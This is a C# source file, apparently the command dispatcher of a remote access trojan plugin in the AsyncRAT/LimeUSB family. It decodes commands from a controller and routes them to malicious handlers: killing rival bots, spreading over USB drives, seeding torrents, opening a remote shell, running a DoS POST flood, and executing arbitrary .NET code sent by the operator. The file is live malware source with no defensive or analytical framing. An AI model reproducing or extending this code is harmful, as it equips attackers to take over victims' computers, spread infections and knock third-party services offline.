using Miscellaneous.Handler;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Plugin
{
    public static class Packet
    {
        public static CancellationTokenSource ctsDos;

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "botKiller":
                        {
                            new HandleBotKiller().RunBotKiller();
                            Thread.Sleep(2500);
                            Connection.Disconnected();
                            break;
                        }

                    case "limeUSB":
                        {
                            new HandleLimeUSB().Initialize();
                            Thread.Sleep(2500);
                            Connection.Disconnected();
                            break;
                        }

                    case "torrent":
                        {
                            new HandleTorrent(unpack_msgpack);
                            Thread.Sleep(2500);
                            Connection.Disconnected();
                            break;
                        }

                    case "shell":
                        {
                            HandleShell.StarShell();
                            break;
                        }

                    case "shellWriteInput":
                        {
                            if (HandleShell.ProcessShell != null)
                                HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                            break;
                        }

                    case "dosAdd":
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "dosAdd";
                            Connection.Send(msgpack.Encode2Bytes());
                            break;
                        }


                    case "dos":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "postStart":
                                    {
                                        ctsDos = new CancellationTokenSource();
                                        new HandleDos().DosPost(unpack_msgpack);
                                        break;
                                    }

                                case "postStop":
                                    {
                                        ctsDos.Cancel();
                                        Thread.Sleep(2500);
                                        Connection.Disconnected();
                                        break;
                                    }
                            }
                            break;
                        }


                    case "executeDotNetCode":
                        {
                            new HandlerExecuteDotNetCode(unpack_msgpack);
                            Connection.Disconnected();
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}